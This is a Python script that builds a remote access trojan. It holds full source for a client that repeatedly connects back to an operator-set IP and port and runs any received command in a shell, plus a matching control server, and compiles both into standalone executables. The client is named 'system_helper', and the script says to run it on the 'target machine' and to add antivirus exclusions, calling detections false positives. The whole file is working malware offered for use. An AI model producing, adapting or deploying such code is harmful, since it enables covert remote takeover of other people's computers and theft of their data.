import os
import sys
import subprocess
import shutil
import re

# --- SOURCE TEMPLATES ---

CLIENT_SOURCE = """import socket
import subprocess
import os
import sys
import time

SERVER_IP = '{SERVER_IP}'
SERVER_PORT = {SERVER_PORT}

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            return s
        except:
            time.sleep(60)

def execute_command(command):
    try:
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        stdout, stderr = process.communicate(timeout=30)
        output = stdout + stderr
        if not output:
            return f"[SUCCESS] Command executed.".encode('utf-8')
        return output
    except subprocess.TimeoutExpired:
        process.kill()
        return f"[ERROR] Timeout.".encode('utf-8')
    except Exception as e:
        return f"[ERROR] {str(e)}".encode('utf-8')

def main():
    while True:
        try:
            socket_conn = connect()
            while True:
                command = socket_conn.recv(1024).decode()
                if command.lower() == 'exit':
                    socket_conn.close()
                    return
                output = execute_command(command)
                socket_conn.send(output)
        except:
            time.sleep(60)

if __name__ == "__main__":
    main()
"""

SERVER_SOURCE = """import socket
import sys
import os

LISTEN_IP = '0.0.0.0'
PORT = {SERVER_PORT}

def main():
    print(f"--- RAT Server (Port {PORT}) ---")
    print("Waiting for connection...")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind((LISTEN_IP, PORT))
        server.listen(1)
        print(f"[*] Listening on {PORT}")
    except Exception as e:
        print(f"[!] CRITICAL ERROR: {e}")
        print("Press Enter to exit...")
        input()
        sys.exit(1)

    client, addr = server.accept()
    print(f"[+] Connected: {addr}")

    while True:
        try:
            cmd = input("# Command: ")
            if cmd.lower() == 'exit':
                client.send('exit'.encode())
                break
            client.send(cmd.encode())
            data = client.recv(4096)
            if not data:
                print("[!] Lost connection.")
                break
            print(data.decode())
        except Exception as e:
            print(f"[!] Error: {e}")
            break
    client.close()
    server.close()

if __name__ == "__main__":
    main()
"""

def install_pyinstaller():
    try:
        import PyInstaller
        print("[+] PyInstaller found.")
        return True
    except ImportError:
        print("[*] PyInstaller not found. Installing now...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
            print("[+] PyInstaller installed successfully.")
            return True
        except Exception as e:
            print(f"[-] Failed to install PyInstaller: {e}")
            print("    Please run: pip install pyinstaller")
            return False

def is_valid_ip(ip):
    pattern = re.compile(r"^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$")
    return pattern.match(ip) is not None

def build_executable(name, source_code):
    print(f"\n[*] Writing source code for {name}...")
    source_file = f"{name}_source.py"
    with open(source_file, "w") as f:
        f.write(source_code)
    
    print(f"[*] Compiling {name} to executable (Console Mode)...")
    print("    (This may take a few minutes)")
    
    # Explicitly force console mode
    cmd = [
        sys.executable, "-m", "PyInstaller",
        "--onefile",
        "--console",  # CRITICAL: Keeps window open
        "--distpath", "./dist",
        "--workpath", f"./build_{name}",
        "--specpath", ".",
        "--name", name,
        "--clean",
        source_file
    ]
    
    try:
        subprocess.run(cmd, check=True)
        print(f"[+] Successfully built {name}!")
        output_name = name
        if os.name == 'nt':
            output_name += ".exe"
        output_path = os.path.abspath(os.path.join("dist", output_name))
        print(f"[!] Executable location: {output_path}")
        print("\n[WARNING] Antivirus software may flag this as a threat (False Positive).")
        print("          This is common for custom RAT tools. Add an exclusion if needed.")
    except subprocess.CalledProcessError as e:
        print(f"[-] Build failed: {e}")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
    finally:
        # Cleanup build files but keep source for debugging if needed
        if os.path.exists(f"./build_{name}"):
            shutil.rmtree(f"./build_{name}", ignore_errors=True)
        # We keep the source file in the root directory so you can inspect it if needed

def main():
    print("--- Local RAT Executable Builder ---")
    print("This tool builds a standalone executable for your current OS only.")
    print("The resulting executable will run in Console Mode (window stays open).")
    
    if not install_pyinstaller():
        sys.exit(1)

    print("\n[Configuration]")
    ip = input("Enter Server IP Address (for the Client): ").strip()
    while not is_valid_ip(ip):
        print("Invalid IP address format. Please try again.")
        ip = input("Enter Server IP Address: ").strip()
    
    port_input = input("Enter Port Number (default 9999): ").strip()
    try:
        port = 9999 if not port_input else int(port_input)
        if port < 1024 or port > 65535:
            print("Port must be between 1024 and 65535. Using 9999.")
            port = 9999
    except ValueError:
        print("Invalid port. Using 9999.")
        port = 9999

    print("\n--- Building Client (Target) ---")
    client_source = CLIENT_SOURCE.replace("{SERVER_IP}", ip).replace("{SERVER_PORT}", str(port))
    build_executable("system_helper", client_source)

    print("\n--- Building Server (Control) ---")
    server_source = SERVER_SOURCE.replace("{SERVER_PORT}", str(port))
    build_executable("control_panel", server_source)

    print("\n[DONE] Build process finished.")
    print("Check the 'dist' folder for your executables.")
    print("Run the Server first, then the Client on the target machine.")

if __name__ == "__main__":
    main()
